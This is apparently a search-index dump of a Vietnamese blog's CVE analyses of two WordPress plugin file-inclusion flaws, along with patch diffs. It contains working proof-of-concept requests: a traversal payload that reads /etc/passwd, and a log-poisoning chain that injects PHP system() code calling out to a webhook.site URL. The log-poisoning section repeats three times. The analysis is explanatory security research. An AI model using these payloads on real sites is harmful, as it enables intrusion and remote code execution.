POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rgetOriginalUrl() ƒë∆∞·ª£c g·ªçi trong h√†m showFile(), g√°n gi√° tr·ªã tr·∫£ v·ªÅ cho $new_url public function showFile( $url ) { // other logic $new_url = $this-\u003egetOriginalUrl( $url ); $new_url_no_query = ( ( strpos( $new_url, '?' ) !== false ) ? substr( $new_url, 0, strpos( $new_url, '?' ) ) : $new_url ); $new_path = $this-\u003egetOriginalPath( $new_url ); $ctype = false; if ( $ext = $this-\u003eisFile( $new_url ) ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getOption( 'hmwp_login_url' ) . '/' ) || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_login_url' ) . '/' ) ) { // other logic } elseif ( $url \u003c\u003e $new_url ) { if ( stripos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-json' ) . '/' ) !== false ) { // other logic } elseif ( strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) . '/' ) !== false || strpos( trailingslashit( $new_url_no_query ), '/' . HMWP_Classes_Tools::getDefault( 'hmwp_wp-signup_url' ) . '/' ) !== false ) { ob_start(); include $new_path; $content = ob_get_clean(); header( \"HTTP/1.1 200 OK\" ); //Echo the html file content echo $content; exit(); } elseif ( ! HMWP_Classes_Tools::getValue( 'nordt' ) ) { // other logic } } } include $new_path l√† ƒëi·ªÉm c√≥ th·ªÉ g√¢y LFI; ƒë·ªÉ th·ª±c thi ƒë∆∞·ª£c, c√°c ƒëi·ªÅu ki·ªán bao quanh ph·∫£i ƒë∆∞·ª£c th·ªèa m√£n. $url kh√°c $new_url Trong getOriginalUrl() ƒëo·∫°n x·ª≠ l√Ω query: if ( isset( $parse_url['query'] ) \u0026\u0026 ! empty( $parse_url['query'] ) ) { $query = $parse_url['query']; $query = str_replace( array( '?', '%3F' ), '\u0026', $query ); $new_url .= ( ! strpos( $new_url, '?' ) ? '?' : '\u0026' ) . $query; } wp_parse_url( 'http://localhost/x/abc?' ) -\u003e c√≥ path nh∆∞ng query r·ªóng (ho·∫∑c query kh√¥ng ƒë∆∞·ª£c set / empty). ƒêi·ªÅu ki·ªán isset(...) \u0026\u0026 ! empty(...) s·∫Ω fail v·ªõi ? kh√¥ng c√≥ param, n√™n kh√¥ng append g√¨ v√†o $new_url. $new_url tr·∫£ v·ªÅ http://localhost/x/abc (kh√¥ng c√≥ ?), trong khi $url ban ƒë·∫ßu l√† http://localhost/x/abc? do ƒë√≥ kh√°c nhau v√† ($url \u003c\u003e $new_url) l√† true. Bi·∫øn $new_url_no_query ph·∫£i ch·ª©a chu·ªói '/' . HMWP_Classes_Tools::getDefault('hmwp_activate_url') . '/'. Khi t√¨m trong m√£ ngu·ªìn plugin v·ªõi t·ª´ kh√≥a hmwp_activate_url, ta th·∫•y h√†m HMWP_Classes_Tools::getDefault('hmwp_activate_url') tr·∫£ v·ªÅ gi√° tr·ªã wp-activate.php. K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa HMWP_Classes_Tools::getDefault( 'hmwp_activate_url' ) Do ƒë√≥, ƒëi·ªÅu ki·ªán th·ª±c t·∫ø l√† $new_url_no_query ph·∫£i ch·ª©a /wp-activate.php/. üëâ Nh∆∞ v·∫≠y, ƒë·ªÉ ƒëo·∫°n include $new_path ƒë∆∞·ª£c th·ª±c thi, URL ph·∫£i c√≥ k√Ω t·ª± ? ·ªü cu·ªëi (ƒë·ªÉ $url \u003c\u003e $new_url) v√† ch·ª©a /wp-activate.php/ trong ƒë∆∞·ªùng d·∫´n. $new_path l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa getOriginalPath($new_url) public function getOriginalPath( $new_url ) { // Remove domain from path $new_path = str_replace( home_url(), '', $new_url ); // Remove queries from path if ( strpos( $new_path, '?' ) !== false ) { $new_path = substr( $new_path, 0, strpos( $new_path, '?' ) ); } return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, '/' ); } H√†m n√†y tr·∫£ v·ªÅ path g·ªëc kh√¥ng ch·ª©a params string, v√≠ d·ª•: \"http://localhost/x/wp-activate.php?\" -\u003e \"/srv/www/wordpress/x/wp-activate.php\" Nh∆∞ v·∫≠y ta ƒë√£ c√≥ c√°c ƒëi·ªÅu ki·ªán c·∫ßn thi·∫øt ƒë·ªÉ LFI x·∫£y ra, ta c·∫ßn t√¨m lu·ªìng g·ªçi ƒë·∫øn showFile() public function maybeShowNotFound() { //If the file doesn't exist //show the file content if ( is_404() ) { $this-\u003eshowFile( $this-\u003egetCurrentURL() ); } else { $this-\u003emaybeShowLogin( $this-\u003egetCurrentURL() ); } } showFile() ƒë∆∞·ª£c maybeShowNotFound n·∫øu client request ƒë·∫øn t√†i nguy√™n kh√¥ng t·ªìn t·∫°i v·ªõi tham s·ªë l√† k·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa getCurrentURL(). public function getCurrentURL() { $url = ''; if ( isset( $_SERVER['HTTP_HOST'] ) ) { // build the URL in the address bar $url = is_ssl() ? 'https://' : 'http://'; $url .= $_SERVER['HTTP_HOST']; $url .= rawurldecode( $_SERVER['REQUEST_URI'] ); } return $url; } URI l·∫•y t·ª´ $_SERVER['REQUEST_URI'] ƒë∆∞·ª£c decode r·ªìi concat v√†o $url ƒë·ªÉ tr·∫£ v·ªÅ. Ta ƒë·∫∑t debug trong h√†m showFile() v√† g·ª≠i request ƒë","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i request v·ªõi LFI payload GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Debug: Debugger v·ªõi valid payload Result: K·∫øt qu·∫£ LFI th√†nh c√¥ng Gi·∫£i th√≠ch: /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? sau khi decode s·∫Ω tr·ªü th√†nh /x/wp-activate.php/..///..///..///..///../etc/passwd? Ta d√πng chu·ªói n√†y ƒë·ªÉ ƒë√°nh l·ª´a Apache, khi·∫øn Apache kh√¥ng ph√°t hi·ªán vi·ªác v∆∞·ª£t Document Root. N·∫øu d√πng /x/wp-activate.php/../../../../../etc/passwd? s·∫Ω b·ªã ph√°t hi·ªán v∆∞·ª£t Document Root. /// v·∫´n ƒë∆∞·ª£c ch·∫•p nh·∫≠n t∆∞∆°ng ƒë∆∞∆°ng /, v√≠ d·ª•: w41bu1@22NS088:~$ ls ///////// bin boot cdrom dev etc home lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var swap.img ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning ‚Üí LFI ‚Üí RCE\rStep 1\rG·ª≠i request v·ªõi PHP code ƒë·∫∑t trong User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rG·ª≠i request v·ªõi LFI payload tr·ªè ƒë·∫øn /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: K·∫øt qu·∫£ LFI =\u003e RCE th√†nh c√¥ng Gi·∫£i th√≠ch: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Khi truy c·∫≠p trang v·ªõi User‚ÄëAgent ch·ª©a payload tr√™n, Apache s·∫Ω l∆∞u payload n√†y v√†o access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" Khi include() m·ªôt file, PHP s·∫Ω th·ª±c thi m·ªçi m√£ PHP (\u003c?php ?\u003e) c√≥ trong n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ. Payload ƒë∆∞·ª£c m√£ ho√° b·∫±ng Base64 v√† gi·∫£i m√£ t·∫°i th·ªùi ƒëi·ªÉm include b·∫±ng base64_decode tr√°nh l·ªói escape d·∫•u ngo·∫∑c k√©p (\" ‚Üí \\\") khi logger l∆∞u. L·ªánh gi·∫£i m√£ s·∫Ω tr·ªü th√†nh: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Cu·ªëi c√πng system() s·∫Ω ch·∫°y l·ªánh n√†y v√† tr·∫£ output. C·∫£nh b√°o L∆∞u √Ω: d√π base64_decode b·ªã ch·∫∑n b·ªüi plugin nh∆∞ng Apache ƒë√£ l∆∞u tr·ªØ tr∆∞·ªõc khi plugin x·ª≠ l√Ω, chu·ªói Base64 v·∫´n ƒë∆∞·ª£c ghi v√†o log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#log-poisoning--lfi--rce"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning ‚Üí LFI ‚Üí RCE\rStep 1\rG·ª≠i request v·ªõi PHP code ƒë·∫∑t trong User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rG·ª≠i request v·ªõi LFI payload tr·ªè ƒë·∫øn /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: K·∫øt qu·∫£ LFI =\u003e RCE th√†nh c√¥ng Gi·∫£i th√≠ch: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Khi truy c·∫≠p trang v·ªõi User‚ÄëAgent ch·ª©a payload tr√™n, Apache s·∫Ω l∆∞u payload n√†y v√†o access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" Khi include() m·ªôt file, PHP s·∫Ω th·ª±c thi m·ªçi m√£ PHP (\u003c?php ?\u003e) c√≥ trong n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ. Payload ƒë∆∞·ª£c m√£ ho√° b·∫±ng Base64 v√† gi·∫£i m√£ t·∫°i th·ªùi ƒëi·ªÉm include b·∫±ng base64_decode tr√°nh l·ªói escape d·∫•u ngo·∫∑c k√©p (\" ‚Üí \\\") khi logger l∆∞u. L·ªánh gi·∫£i m√£ s·∫Ω tr·ªü th√†nh: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Cu·ªëi c√πng system() s·∫Ω ch·∫°y l·ªánh n√†y v√† tr·∫£ output. C·∫£nh b√°o L∆∞u √Ω: d√π base64_decode b·ªã ch·∫∑n b·ªüi plugin nh∆∞ng Apache ƒë√£ l∆∞u tr·ªØ tr∆∞·ªõc khi plugin x·ª≠ l√Ω, chu·ªói Base64 v·∫´n ƒë∆∞·ª£c ghi v√†o log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Log poisoning ‚Üí LFI ‚Üí RCE\rStep 1\rG·ª≠i request v·ªõi PHP code ƒë·∫∑t trong User-Agent header GET / HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu;\u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Step 2\rG·ª≠i request v·ªõi LFI payload tr·ªè ƒë·∫øn /var/log/apache2/other_vhosts_access.log GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Content-Length: 0 Result: K·∫øt qu·∫£ LFI =\u003e RCE th√†nh c√¥ng Gi·∫£i th√≠ch: \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003e Khi truy c·∫≠p trang v·ªõi User‚ÄëAgent ch·ª©a payload tr√™n, Apache s·∫Ω l∆∞u payload n√†y v√†o access log: w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log 127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 +0700] \"GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1\" 403 2844 \"-\" \"Mozilla/5.0 (X11; Ubuntu; \u003c?php system(base64_decode('Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==')); ?\u003eLinux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0\" Khi include() m·ªôt file, PHP s·∫Ω th·ª±c thi m·ªçi m√£ PHP (\u003c?php ?\u003e) c√≥ trong n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ. Payload ƒë∆∞·ª£c m√£ ho√° b·∫±ng Base64 v√† gi·∫£i m√£ t·∫°i th·ªùi ƒëi·ªÉm include b·∫±ng base64_decode tr√°nh l·ªói escape d·∫•u ngo·∫∑c k√©p (\" ‚Üí \\\") khi logger l∆∞u. L·ªánh gi·∫£i m√£ s·∫Ω tr·ªü th√†nh: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Cu·ªëi c√πng system() s·∫Ω ch·∫°y l·ªánh n√†y v√† tr·∫£ output. C·∫£nh b√°o L∆∞u √Ω: d√π base64_decode b·ªã ch·∫∑n b·ªüi plugin nh∆∞ng Apache ƒë√£ l∆∞u tr·ªØ tr∆∞·ªõc khi plugin x·ª≠ l√Ω, chu·ªói Base64 v·∫´n ƒë∆∞·ª£c ghi v√†o log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n ‚â§ 5.4.01 c·ªßa Hide My WP Ghost cho ph√©p LFI v√¨ plugin t√°i t·∫°o ƒë∆∞·ªùng d·∫´n r·ªìi include() m√† kh√¥ng canonicalize/whitelist. B·∫±ng c√°ch k·∫øt h·ª£p log‚Äëpoisoning v√† payload ch·ª©a /wp-activate.php/?, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·ª´ LFI leo th√†nh RCE trong m·ªôt s·ªë c·∫•u h√¨nh. L·ªó h·ªïng ƒë∆∞·ª£c v√° trong 5.4.02 b·∫±ng vi·ªác sanitize URL tr∆∞·ªõc khi tr·∫£ v·ªÅ. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng include tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ request. D√πng realpath() / basename() / whitelist / ki·ªÉm tra base_dir tr∆∞·ªõc khi include. sanitize_text_field() kh√¥ng ƒë·ªß ƒë·ªÉ ngƒÉn traversal. Log poisoning (User‚ÄëAgent, Referer‚Ä¶) c√≥ th·ªÉ t·∫°o ngu·ªìn payload cho LFI ‚Äî kh√¥ng ghi th√¥ n·ªôi dung c√≥ th·ªÉ ƒë∆∞·ª£c include sau n√†y. V√° ph·∫£i k·∫øt h·ª£p: sanitize + canonicalize + gi·ªõi h·∫°n th∆∞ m·ª•c + ki·ªÉm so√°t quy·ªÅn ghi log. ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:4:4","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress Hide My WP Ghost Plugin \u003c= 5.4.01 is vulnerable to Local File Inclusion ","date":"2025-10-18","objectID":"/vi/posts/2025-10-18-cve-2025-26909/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/vi/posts/2025-10-18-cve-2025-26909/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin License For Envato phi√™n b·∫£n ‚â§ 1.0.0 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) v√† 1.1.0 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-17","objectID":"/vi/posts/2025-10-17-cve-2025-39399/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/vi/posts/2025-10-17-cve-2025-39399/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; } ?\u003e \u003c/div\u003e Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã c·ªßa bi·∫øn $action ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ tham s·ªë $_GET['tab']. M·∫∑c d√π bi·∫øn n√†y ƒë∆∞·ª£c x·ª≠ l√Ω qua h√†m sanitize_text_field(), h√†m n√†y ch·ªâ lo·∫°i b·ªè th·∫ª HTML - ch·ª© kh√¥ng ngƒÉn ch·∫∑n c√°c chu·ªói traversal nh∆∞ ../. Do ƒë√≥, attacker c√≥ th·ªÉ truy·ªÅn v√†o m·ªôt gi√° tr·ªã nh∆∞ ?tab=../../somefile, khi·∫øn $action ch·ª©a ƒë∆∞·ªùng d·∫´n ngo√†i mong ƒë·ª£i. Khi bi·∫øn n√†y ƒë∆∞·ª£c n·ªëi v√†o $template v√† sau ƒë√≥ ƒë∆∞·ª£c include =\u003e X·∫£y ra LFI. B·∫£n v√°: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e B·∫£n v√° ƒë√£ th·ª±c hi·ªán nhi·ªÅu bi·ªán ph√°p ƒë·ªÉ ngƒÉn ch·∫∑n l·ªó h·ªïng LFI v√† c·ªßng c·ªë t√≠nh b·∫£o m·∫≠t c·ªßa ph·∫ßn x·ª≠ l√Ω tham s·ªë tab: S·ª≠ d·ª•ng whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Ki·ªÉm tra nonce ch·ªëng CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) L√Ω do CVE ƒë∆∞·ª£c g√°n l√† Unauthenticated l√† v√¨ k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn t√†i kho·∫£n ri√™ng tr√™n site m·ª•c ti√™u ƒë·ªÉ khai th√°c. K·ªπ 